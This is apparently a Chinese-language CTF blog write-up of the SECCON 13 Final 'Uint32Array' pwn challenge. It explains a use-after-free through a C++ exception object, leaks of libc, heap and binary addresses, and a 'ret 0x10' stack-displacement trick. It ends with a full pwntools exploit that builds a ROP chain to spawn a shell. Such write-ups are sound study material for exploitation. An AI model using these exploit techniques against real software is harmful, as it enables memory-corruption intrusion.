---
date: 2025-03-03 10:21:56
layout: post
title: unexpected gadget and stack displacement
subtitle: SECCON 13 FINAL Uint32Array Writeup 复现
description: >-
    After hijacking the control flow...
image: >-
  /assets/img/uploads/rainy_street.jpg
optimized_image: >-
  /assets/img/uploads/rainy_street.jpg
category: ctf
tags:
  - pwn
  - gadget
author: rosayxy
paginate: true
---
第一次线下打 SECCON，好累，大感谢队友 Yasar,Sceleri,Ouuan 的 carry hhh     

本题在赛场上做到了栈，堆，libc，proc 的 leak，并且有任意地址的控制流劫持（proc，libc），但是控制不了参数，，所以比较 sad qaq    

这个在赛场上是和队友 k4ra5u 老师一起做的，我们打到了劫持控制流，然后用 `mov r12,rdx;call [rbx+0x10]` 的 gadget 覆盖函数指针，然后 `rbx + 0x10` 会指向一个我们可以控制的指针，我们覆盖它为 one_gadget 来回避 one_gadget 调用时的 movaps 栈对齐的问题，但是这样的话，r8 或者 xmm0 我们不可控，还是不满足 one_gadget 的成功条件。好像 r3kapig 的师傅（感谢做出来的师傅！感谢空白！）用同样的思路在比赛的时候做了出来，但是我起了附件中的 Docker 跑了师傅的 exp 可能还是有不正确的参数如下（挠头）:(     

![alt_text](/assets/img/uploads/failure.png)

所以，高版本的 one_gadget 虽然有点难用（上学期打出心理阴影了qaq），但是还是可以试试的，在用 one_gadget 的时候，可以用指定 `-l 100` 的方式让它输出更多的 gadget   
以及最好还是用原生 Docker 调 one_gadget，patchelf 后的 binary 还是有可能和远程有寄存器值不一样的    

然后 TSG 的师傅在 discord 上发了本题 writeup（谢谢师傅！），感觉很 trick 但是很帅，以后也可能用得到，遂复现并且记一波 writeup     

## 漏洞
给了一次 malloc，malloc 的时候有 UAF     
```c
void AskArray(Uint32Array& arr) {
  size_t size = 0;
  do {
    std::cout << "size = ";
    std::cin >> size;
  } while (size > 100);

  arr = Uint32Array(size);
  arr.clear();
}
```
这个 `Uint32Array(size)` 临时变量，因为 Uint32Array 没有实现 copy constructor，所以这个赋值是浅拷贝，而且这个临时变量会在浅拷贝之后被析构掉（这个看汇编代码还是挺明显的）（古早的 OOP 知识攻击了我（当时还是有在认真听课滴xs））      

所以我们的 arr 其实是 free 掉的堆块，但是我们有一定写的能力    

## leak
它在这个    
```c
try {
        arr.at(index) = value;
      } catch(const std::out_of_range& e) { // get a libc addr on heap
        std::cout << "[ERR] " << e.what() << std::endl
                  << "[ERR] Would you like to enter recovery mode? [y=1/N=0]: ";
        std::cin >> choice;
        if (choice == 1) {
          std::cout << "[ERR] Entering recovery mode: Try again." << std::endl;
          AskIndex(index);
          AskValue(value);
          arr.at(index) = value;
        }
      }
```
try-catch 抛出异常时，会在堆上 allocate 出来一个结构体（这个在后文中，我们称为 exception object），里面有函数指针，堆地址等字段，我们可以控制 Array 的 size，让我们可以 UAF 的堆块被 exception object 占住，从而进行 leak 和 overwrite 等操作（其实这个 UAF 的思路更像是 kernel pwn 里面的hhh）     

![alt_text](/assets/img/uploads/uint32array_leak.png)

如图，我们可以直接 leak 出 libc heap proc 的基地址      

## control flow hijack
就像是之前 kernel pwn 利用一些内核结构体的思路（比如 tty_struct，pipe_buffer 这些），我们一个很直接的想法就是改这个块所具有的函数指针，然后劫持控制流     
值得一提的是，我们在 alloc 出来 exception object 之后只有一次修改该 object 0x4 字节的机会（并且要求是4字节对齐），所以如果控制函数指针的话，我们调用该指针的参数就控制不了     
一个最直接的想法就是尝试 one_gadget 但是多次尝试未果，然后就是非常经典的准备打栈迁移的想法（经典 kernel pwn 做法hhh，见[以前这个博客](https://rosayxy.github.io/sctf-kno_puts_revenge_writeup/)），找到哪些寄存器指向的一块内存中有我们可控的东西（就像指向我们可写的堆地址），然后找 gadget 完成进一步调用（或者打栈迁移）    
所以就是之前写到的这个思路了 “然后用 `mov r12,rdx;call [rbx+0x10]` 的 gadget 覆盖函数指针，然后 `rbx + 0x10` 会指向一个我们可以控制的指针，我们覆盖它为 one_gadget 来回避 one_gadget 调用时的 movaps 栈对齐的问题”，其中 `rbx` 指向的位置是 malloc 出来地址 + 0x80，我一开始没有意识到 `rbx + 0x10` 的位置是我可控的，队友（感谢 khls!）发现了这一点，应该是 exception object 是 malloc 0x90，而我们 malloc 0x98 就可以控制 malloc_addr + 0x90 的位置了 ~     
然后就打不通了qaq qaq qaq sad      

## special gadget
在 discord 群里 TSG 的师傅发了 writeup，是用了一个之前完全没想到的 gadget: `ret 0x10`    
这个 gadget 的作用是返回，然后升 0x10 的栈空间    
所以这个在返回 main 函数时，原有的栈上各个结构和升栈后的栈上各个结构间有一个错位，而这个就可以 hack 一波了hhh ~    
最重要的，我们的 `array` 的 `buffer_` 在栈上访问的时候都是访问的 \[rsp\] 位置的指针，在升栈之后变成访问了原先代码中的 \[old_rsp + 0x10\]，这个位置在错误处理之前被赋值为了 \[old_rsp + 0x30\]      

![alt_text](/assets/img/uploads/assignment_uint32_array.png)  

然后就可以把栈上的 size 域改大，做到栈上任意写    
之后就是一些比较好处理的小问题了，比如 canary 会错位，所以需要先 leak 再写；需要让以下 delete 函数不 crash 所以要在栈上高地址处伪造堆块之类的操作了hhh    
```c
if ( array_buf )
   operator delete[](array_buf);
```
这个 gadget 以后也可以 mark 一下，特别巧是因为利用栈的错位导致了栈上结构的覆写，当然，这个也是需要栈上用 rsp 寻址，如果用 rbp 寻址的话 这个方法可能就 gg 了     
以及想到了 [TSG CTF 的 piercing misty mountain](https://rosayxy.github.io/writeups/) 劫持 rbp，利用 read 的时候用 rbp 寻址，来做到向 bss 段读入 ropchain 的操作，感觉有点异曲同工 ~     

## exp
```py
from pwn import*
context(arch='amd64', os='linux', log_level='debug')
p=process("./chall")
libc = ELF("./libc.so.6")
p.recvuntil("size = ")
p.sendline("38")
def set(index,val):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("index = ")
    p.sendline(str(index))
    p.recvuntil("value = ")
    p.sendline(str(val))

def get(index):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("index = ")
    p.sendline(str(index))
    p.recvuntil("= ")
    return int(p.recvline())

# gdb.attach(p)
# pause()
set(0,0x10)
# try enter recovery mode
set(200,0x31)
p.recvuntil("[ERR] Would you like to enter recovery mode? [y=1/N=0]: ")
p.sendline("1")
p.recvuntil("[ERR] Entering recovery mode: Try again.\n")
p.sendline("20")
p.sendline("321321")
# start leaking
proc_lower = get(4)
proc_upper = get(5)
gdb.attach(p)
pause()
proc_leak = proc_lower + (proc_upper<<32)

libc_leak = get(6)
libc_leak = libc_leak + (get(7)<<32)

heap_leak = get(22)
heap_leak = heap_leak + (get(23)<<32)
print(hex(heap_leak))
print(hex(proc_leak))
print(hex(libc_leak))
# get base
libc_base = libc_leak - 0x3fb100
proc_base = proc_leak - 0x3cc8
print(hex(libc_base))
print(hex(proc_base))
# try trigger it again
set(200,0x31)
lower = (libc_base + 0xbbcbe)%(1<<32) # ret 0x10 从而破坏 main 函数栈平衡
p.recvuntil("[ERR] Would you like to enter recovery mode? [y=1/N=0]: ")
p.sendline("1")

p.recvuntil("[ERR] Entering recovery mode: Try again.\n")
p.sendline("26")
p.recvuntil("value = ")
p.sendline(str(lower))
# leak canary
binshell_addr = libc_base + 0x1CB42F
pop_rdi_ret = libc_base + 0x10f75b
system_addr = libc_base + libc.sym["system"]
ret = libc_base + 0x016F567
# edit size to big num
set(4,0x100)
# edit return address
set(0x1e,pop_rdi_ret%0x100000000)
set(0x1f,pop_rdi_ret//0x100000000)
set(0x20,binshell_addr%0x100000000)
set(0x21,binshell_addr//0x100000000)
set(0x22,ret%0x100000000)
set(0x23,ret//0x100000000)
set(0x24,system_addr%0x100000000)
set(0x25,system_addr//0x100000000)
# gdb.attach(p)
# pause()
canary = get(10)+get(11)*0x100000000
print(hex(canary))
stack_leak = get(14)+get(15)*0x100000000
set(14,canary%0x100000000)
set(15,canary//0x100000000)

# leak stack

print(hex(stack_leak))
# 从 return address 更上一层覆盖
set(0x24*2,0x0)
set(0x24*2+1,0x0)
set(0x25*2,0x21)
set(0x25*2+1,0x0)
set(0x52,0x21)
set(0x53,0x0)
# gdb.attach(p,'''
#     b* $rebase(0x1701)
# ''')
# pause()
set(8,0xffffffff)
set(9,0xffffffff)

# 0x7ffc64b64c78 0x7ffc64b64c20
set(0x3ffffffffffffff8,(stack_leak - 0x58)%0x100000000)
# 还需要使得 delete[]array_buf 不挂掉
# free 地址 0x7fff6a16d6a0 array 地址 0x7fff6a16d6a0 不知道是不是
# trigger
p.recvuntil("> ")
p.sendline("3")
# try sending
# 调用 0x290 开头的函数时，rsi 和 rcx 是我们堆地址
# 调用到咱们的 0x100 时，rdi rbx 为堆地址 0x750 rcx 为 0x6d0 rsi 为 0x730
# 调用到我们的 0x290 时，rcx 为 0x6d0 rsi 为 0x730
# 我们可控的是 0x760 处的8字节
# one_gadget 0x583dc 0x583e3 0xef4ce 0xef52b 但是都不太能用
p.interactive()

```